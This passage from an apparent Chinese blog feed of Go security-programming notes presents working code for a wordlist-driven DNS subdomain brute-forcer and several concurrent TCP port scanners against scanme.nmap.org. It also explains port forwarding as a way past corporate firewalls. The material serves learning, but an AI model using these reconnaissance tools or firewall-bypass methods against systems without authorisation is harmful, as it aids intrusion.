class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bufio&quot;</span></span><br><span class="line"><span class="string">&quot;errors&quot;</span></span><br><span class="line"><span class="string">&quot;flag&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;text/tabwriter&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/miekg/dns&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> result <span class="keyword">struct</span> &#123;</span><br><span class="line">IPAddress <span class="type">string</span></span><br><span class="line">Hostname  <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> empty <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lookupA</span><span class="params">(fqdn, serverAddr <span class="type">string</span>)</span></span> ([]<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> m dns.Msg</span><br><span class="line"><span class="keyword">var</span> ips []<span class="type">string</span></span><br><span class="line">m.SetQuestion(dns.Fqdn(fqdn), dns.TypeA)</span><br><span class="line">in, err := dns.Exchange(&amp;m, serverAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> ips, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(in.Answer) &lt; <span class="number">1</span> &#123;</span><br><span class="line"><span class="keyword">return</span> ips, errors.New(<span class="string">&quot;no answer&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, answer := <span class="keyword">range</span> in.Answer &#123;</span><br><span class="line"><span class="keyword">if</span> a, ok := answer.(*dns.A); ok &#123;</span><br><span class="line">ips = <span class="built_in">append</span>(ips, a.A.String())</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ips, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lookupCNAME</span><span class="params">(fqdn, serverAddr <span class="type">string</span>)</span></span> ([]<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> m dns.Msg</span><br><span class="line"><span class="keyword">var</span> fqdns []<span class="type">string</span></span><br><span class="line">m.SetQuestion(dns.Fqdn(fqdn), dns.TypeCNAME)</span><br><span class="line">in, err := dns.Exchange(&amp;m, serverAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fqdns, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(in.Answer) &lt; <span class="number">1</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fqdns, errors.New(<span class="string">&quot;no answer&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, answer := <span class="keyword">range</span> in.Answer &#123;</span><br><span class="line"><span class="keyword">if</span> c, ok := answer.(*dns.CNAME); ok &#123;</span><br><span class="line">fqdns = <span class="built_in">append</span>(fqdns, c.Target)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> fqdns, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lookup</span><span class="params">(fqdn, serverAddr <span class="type">string</span>)</span></span> []result &#123;</span><br><span class="line"><span class="keyword">var</span> results []result</span><br><span class="line"><span class="keyword">var</span> cfqdn = fqdn <span class="comment">//请勿修改原始信息</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">cnames, err := lookupCNAME(cfqdn, serverAddr)</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &amp;&amp; <span class="built_in">len</span>(cnames) &gt; <span class="number">0</span> &#123;</span><br><span class="line">cfqdn = cnames[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">ips, err := lookupA(cfqdn, serverAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">break</span> <span class="comment">// 该主机名没有DNS</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, ip := <span class="keyword">range</span> ips &#123;</span><br><span class="line">results = <span class="built_in">append</span>(results, result&#123;IPAddress: ip, Hostname: fqdn&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span> <span class="comment">// 已经处理了所有结果</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> results</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">(tracker <span class="keyword">chan</span> empty, fqdns <span class="keyword">chan</span> <span class="type">string</span>, gather <span class="keyword">chan</span> []result, serverAddr <span class="type">string</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> fqdn := <span class="keyword">range</span> fqdns &#123;</span><br><span class="line">results := lookup(fqdn, serverAddr)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(results) &gt; <span class="number">0</span> &#123;</span><br><span class="line">gather &lt;- results</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> e empty</span><br><span class="line">tracker &lt;- e</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">flDomain      = flag.String(<span class="string">&quot;Domain&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;The domain to perform guessing against.&quot;</span>)</span><br><span class="line">flWordlist    = flag.String(<span class="string">&quot;Wordlist&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;The wordlist to use for guessing.&quot;</span>)</span><br><span class="line">flWorkerCount = flag.Int(<span class="string">&quot;c&quot;</span>, <span class="number">100</span>, <span class="string">&quot;The amount of workers to use.&quot;</span>)</span><br><span class="line">flServerAddr  = flag.String(<span class="string">&quot;server&quot;</span>, <span class="string">&quot;8.8.8.8:53&quot;</span>, <span class="string">&quot;The DNS server to use.&quot;</span>)</span><br><span class="line">results       []result</span><br><span class="line">)</span><br><span class="line">flag.Parse()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> *flDomain == <span class="string">&quot;&quot;</span> || *flWordlist == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;-domain and -wordlist are required&quot;</span>)</span><br><span class="line">os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// make 创建内存并分配地址</span></span><br><span class="line">fqdns := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>, *flWorkerCount)</span><br><span class="line">gather := <span class="built_in">make</span>(<span class="keyword">chan</span> []result)</span><br><span class="line">tracker := <span class="built_in">make</span>(<span class="keyword">chan</span> empty)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个新的scanner</span></span><br><span class="line">fh, err := os.Open(*flWordlist)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> fh.Close()</span><br><span class="line">scanner := bufio.NewScanner(fh)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动工人函数</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; *flWorkerCount; i++ &#123;</span><br><span class="line"><span class="keyword">go</span> worker(tracker, fqdns, gather, *flServerAddr)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> scanner.Scan() &#123;</span><br><span class="line">fqdns &lt;- fmt.Sprintf(<span class="string">&quot;%s.%s&quot;</span>, scanner.Text(), *flDomain)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取结果</span></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> r := <span class="keyword">range</span> gather &#123;</span><br><span class="line">results = <span class="built_in">append</span>(results, r...)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> e empty</span><br><span class="line">tracker &lt;- e</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭通道并显示结果</span></span><br><span class="line"><span class="built_in">close</span>(fqdns)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; *flWorkerCount; i++ &#123;</span><br><span class="line">&lt;-tracker</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">close</span>(gather)</span><br><span class="line">&lt;-tracker</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印结果</span></span><br><span class="line">w := tabwriter.NewWriter(os.Stdout, <span class="number">0</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="string">&#x27; &#x27;</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> _, r := <span class="keyword">range</span> results &#123;</span><br><span class="line">fmt.Fprintf(w, <span class="string">&quot;%s\t%s\n&quot;</span>, r.Hostname, r.IPAddress)</span><br><span class="line">&#125;</span><br><span class="line">w.Flush()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>原书作者的代码真的让我感到惊艳，尤其是关于管道的应用，通过管道，让子线程们就像一个公司的人一样工作，比如我们有100个子线程，那么就像100个人，9点上班，大家9点前陆续到位（依次开启线程）。然后9点，所有人准时到齐开始上班，打开一个总的文档（fqdns），老板一次将今天的任务放上去（123-125行），而大家从其中领取任务不断完成，每完成一个任务就将任务的结果给迟到的人力（老板吧任务都放到共享文档后才来（子域名全部放到管道中后才来，128行））。当老板发现，共享文档中没任务了（fqdns管道中没子域名了）遍把这个共享文档关了，员工发现，文档中没任务了或者文档干脆直接被关了，干完手上的任务与人力交接后，遍跟老板打卡下班。直到最后一个员工干完了活，与人力交接完成（人力并不知道是最后一员工，仍在等待下一个人的结果）。该员工到老板那打卡下班后，老板发现100个人走完了，便过去给人力电脑关机（关闭gather管道），人力知道没活了，便也打卡下班。留老板最后把结果打印出来。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Go渗透编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2.TCP、扫描器和代理</title>
      <link href="/2023/02/01/Go/2.TCP%E3%80%81%E6%89%AB%E6%8F%8F%E5%99%A8%E5%92%8C%E4%BB%A3%E7%90%86/"/>
      <url>/2023/02/01/Go/2.TCP%E3%80%81%E6%89%AB%E6%8F%8F%E5%99%A8%E5%92%8C%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="TCP握手机制"><a href="#TCP握手机制" class="headerlink" title="TCP握手机制"></a>TCP握手机制</h2><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230117114103918.png" alt="image-20230117114103918" style="zoom:67%;" /><h2 id="端口转发绕过防火墙"><a href="#端口转发绕过防火墙" class="headerlink" title="端口转发绕过防火墙"></a>端口转发绕过防火墙</h2><ul><li><p>某些情况下，可以使用中间系统代理连接绕过或穿透防火墙从而避开这些限制，这种技术被称为<strong>端口转发</strong></p></li><li><p>许多企业网络限制内部资产建立与恶意站点的H∏P连接。假设有一个名为evil.com的恶意网站，如果有员工尝试直接测览evil.com，则防火墙会阻止该请求°但是,如果员工拥有允许通过防火墙的外部系统（例如stacktitan.com），则该员工可以利用允许的域来反弹与evil.com的连接</p><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230117114441819.png" alt="image-20230117114441819"></p></li><li><p>可以使用端口转发绕过多种限制性网络配置。例如：可以通过跳箱转发流量，以访问分段网络或访问绑定到限制性接口的端口</p></li></ul><h2 id="编写一个TCP扫描器"><a href="#编写一个TCP扫描器" class="headerlink" title="编写一个TCP扫描器"></a>编写一个TCP扫描器</h2><h4 id="要使用的包"><a href="#要使用的包" class="headerlink" title="要使用的包"></a>要使用的包</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net.Dial(network, address <span class="type">string</span>)</span><br></pre></td></tr></table></figure><ul><li>第一个参数是一个字符串，用于标识要启动的连接的类型。这是因为Dil不仅适用于TCP,它还可以用于创建使用UNIX套接字、UDP和第4层协议的连接。你可以使用其他字符串，但为简洁起见，这里将使用字符串tcp。</li></ul><h4 id="普通版本"><a href="#普通版本" class="headerlink" title="普通版本"></a>普通版本</h4><h5 id="仅扫描一个端口"><a href="#仅扫描一个端口" class="headerlink" title="仅扫描一个端口"></a>仅扫描一个端口</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">_, err := net.Dial(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;scanme.nmap.org:80&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Connection successful&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="扫描1024个端口"><a href="#扫描1024个端口" class="headerlink" title="扫描1024个端口"></a>扫描1024个端口</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">1024</span>; i++ &#123;</span><br><span class="line">addr := fmt.Sprintf(<span class="string">&quot;scanme.nmap.org:%d&quot;</span>, i)</span><br><span class="line">conn, err := net.Dial(<span class="string">&quot;tcp&quot;</span>, addr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">//fmt.Println(&quot;Connection Fail&quot;)</span></span><br><span class="line"><span class="keyword">continue</span> <span class="comment">// 端口已关闭或者过滤</span></span><br><span class="line">&#125;</span><br><span class="line">conn.Close()</span><br><span class="line">fmt.Printf(<span class="string">&quot;%d open\n&quot;</span>, i)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="并发版本"><a href="#并发版本" class="headerlink" title="并发版本"></a>并发版本</h4><h5 id="“极速”的端口扫描"><a href="#“极速”的端口扫描" class="headerlink" title="“极速”的端口扫描"></a>“极速”的端口扫描</h5><ul><li>运行完上面代码后，程序几乎立刻退出了。</li><li>刚才运行的代码会为每个连接启动一个goroutine，而主goroutine并不知道要等待连<br>接发生。因此，代码在for循环完成迭代后回退出。</li><li>这可能比代码与目标端口之间的数据包网络交换还要快。对于数据包仍在运行的端口，可能无法获得其准确的结果</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">1024</span>; i++ &#123;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(i <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">addr := fmt.Sprintf(<span class="string">&quot;scanme.nmap.org:%d&quot;</span>, i)</span><br><span class="line">conn, err := net.Dial(<span class="string">&quot;tcp&quot;</span>, addr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">//fmt.Println(&quot;Connection Fail&quot;)</span></span><br><span class="line"><span class="keyword">return</span> <span class="comment">// 端口已关闭或者过滤</span></span><br><span class="line">&#125;</span><br><span class="line">conn.Close()</span><br><span class="line">fmt.Printf(<span class="string">&quot;%d open\n&quot;</span>, i)</span><br><span class="line">&#125;(i)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>解决方案：</p><ol><li><p>使用sync包中的WajtGroup进行同步扫描</p></li><li></li></ol></li></ul><h5 id="使用WaitGroup进行同步扫描"><a href="#使用WaitGroup进行同步扫描" class="headerlink" title="使用WaitGroup进行同步扫描"></a>使用WaitGroup进行同步扫描</h5><ul><li>创建WaitGroup后，可以在此结构体上调用一些方法。第一个是Add(i),它将按所提供的数字递增内部计数器。接下来，Done()将计数器减1。最后，Wait()会阻止在其中调用它的goroutine的执行，并且在内部计数器达到零之前将不允许进一步执行。你可以组合这些调用以确保主goroutine等待所有连接完成。</li><li>该程序比初始版本有了进步，但仍然不算是正确的。如果对多个主机多次执行此程<br>序，则可能会看到不一致的结果</li><li>同时扫描过多的主机或端口可能会导致网络或系统限制，造成结果不正确</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup <span class="comment">//1     用作同步计数器</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">1024</span>; i++ &#123;</span><br><span class="line">wg.Add(<span class="number">1</span>) <span class="comment">//2    通过wg.Add(1)递增计数器</span></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(i <span class="type">int</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> wg.Done() <span class="comment">//3      只要执行对一个端口的扫描，对wg.Done()的延迟调用就会使计数器递减</span></span><br><span class="line">addr := fmt.Sprintf(<span class="string">&quot;scanme.nmap.org:%d&quot;</span>, i)</span><br><span class="line">conn, err := net.Dial(<span class="string">&quot;tcp&quot;</span>, addr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">//fmt.Println(&quot;Connection Fail&quot;)</span></span><br><span class="line"><span class="keyword">return</span> <span class="comment">// 端口已关闭或者过滤</span></span><br><span class="line">&#125;</span><br><span class="line">conn.Close()</span><br><span class="line">fmt.Printf(<span class="string">&quot;%d open\n&quot;</span>, i)</span><br><span class="line">&#125;(i)</span><br><span class="line">&#125;</span><br><span class="line">wg.Wait() <span class="comment">//4   阻塞main函数，直到所有工作完成并且计数器值为0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="使用工人池进行端口扫描"><a href="#使用工人池进行端口扫描" class="headerlink" title="使用工人池进行端口扫描"></a>使用工人池进行端口扫描</h5><ul><li>为避免结果不一致，我们需要使用goroutine池管理正在进行的并发工作。使用for循环创建一定数量的工人goroutine作为资源池：然后，在main()线程中使用通道提供工作。</li><li>有趣的现象:数字不是以特定的顺序打印的；欢迎来到精彩的并行世界。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">(ports <span class="keyword">chan</span> <span class="type">int</span>, wg *sync.WaitGroup)</span></span> &#123;</span><br><span class="line">   <span class="keyword">for</span> p := <span class="keyword">range</span> ports &#123;</span><br><span class="line">      fmt.Println(p)</span><br><span class="line">      wg.Done()</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="keyword">var</span> wg sync.WaitGroup <span class="comment">//1     用作同步计数器</span></span><br><span class="line"></span><br><span class="line">   ports := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">100</span>) <span class="comment">//创建管道，缓冲区为100</span></span><br><span class="line">   <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">cap</span>(ports); i++ &#123;</span><br><span class="line">      <span class="keyword">go</span> worker(ports, &amp;wg)   <span class="comment">//并发工作，再收到ports&lt;-i才会开始工作</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> i := <span class="number">0</span>; i &lt;= <span class="number">10</span>; i++ &#123;</span><br><span class="line">      wg.Add(<span class="number">1</span>)</span><br><span class="line">      ports &lt;- i</span><br><span class="line">   &#125;</span><br><span class="line">   wg.Wait()</span><br><span class="line">   <span class="built_in">close</span>(ports) <span class="comment">//关闭管道</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="最终版本：多通道通信"><a href="#最终版本：多通道通信" class="headerlink" title="最终版本：多通道通信"></a>最终版本：多通道通信</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">(ports <span class="keyword">chan</span> <span class="type">int</span>, results <span class="keyword">chan</span> <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">   <span class="keyword">for</span> p := <span class="keyword">range</span> ports &#123;</span><br><span class="line">      addr := fmt.Sprintf(<span class="string">&quot;scanme.nmap.org:%d&quot;</span>, p)</span><br><span class="line">      conn, err := net.Dial(<span class="string">&quot;tcp&quot;</span>, addr)</span><br><span class="line">      <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">          results &lt;- <span class="number">0</span>  <span class="comment">//没有打开的端口送给results管道赋值0(总感觉有点低效)</span></span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">      &#125;</span><br><span class="line">      conn.Close()  <span class="comment">//关闭连接</span></span><br><span class="line">      results &lt;- p  <span class="comment">//打开的端口送给results管道</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   ports := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">100</span>)</span><br><span class="line">   results := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>) <span class="comment">//没有限制</span></span><br><span class="line">   <span class="keyword">var</span> openports []<span class="type">int</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">cap</span>(ports); i++ &#123;  <span class="comment">//100个工人疯狂工作哈哈</span></span><br><span class="line">      <span class="keyword">go</span> worker(ports, results)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123; <span class="comment">//1024个端口号传入ports管道</span></span><br><span class="line">      <span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">1024</span>; i++ &#123;</span><br><span class="line">         ports &lt;- i</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;()</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">1024</span>; i++ &#123; <span class="comment">//从results管道取出数据</span></span><br><span class="line">      port := &lt;-results</span><br><span class="line">      <span class="keyword">if</span> port != <span class="number">0</span> &#123;</span><br><span class="line">         openports = <span class="built_in">append</span>(openports, port)</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">close</span>(ports)  <span class="comment">//关闭管道</span></span><br><span class="line">   <span class="built_in">close</span>(results)</span><br><span class="line">   sort.Ints(openports)  <span class="comment">//对开启的端口做个排序</span></span><br><span class="line">   <span class="keyword">for</span> _, port := <span class="keyword">range</span> openports &#123; <span class="comment">//输出</span></span><br><span class="line">      fmt.Printf(<span class="string">&quot;%d open\n&quot;</span>, port)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="构造TCP代理"><a href="#构造TCP代理" class="headerlink" title="构造TCP代理"></a>构造TCP代理</h2><h3 id="io-Reader和io-Writer"><a href="#io-Reader和io-Writer" class="headerlink" title="io.Reader和io.Writer"></a>io.Reader和io.Writer</h3><ul><li><p>对于I&#x2F;0任务来说，这两种数据类型是必不可少的</p></li><li><p>&#96;&#96;&#96;go<br>type Reader interface {<br>Read(p []byte) (n int, err error)<br>}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 自定义包装实现接口</span><br><span class="line"></span><br><span class="line">- ```go</span><br><span class="line">  type FooWriter struct &#123;&#125;</span><br><span class="line">  func (fooWriter *FooWriter) Write(p []byte) (int, error)&#123;</span><br><span class="line">      return len(dataWrittenSomewhere), nil</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="reader和Writer演示"><a href="#reader和Writer演示" class="headerlink" title="reader和Writer演示"></a>reader和Writer演示</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 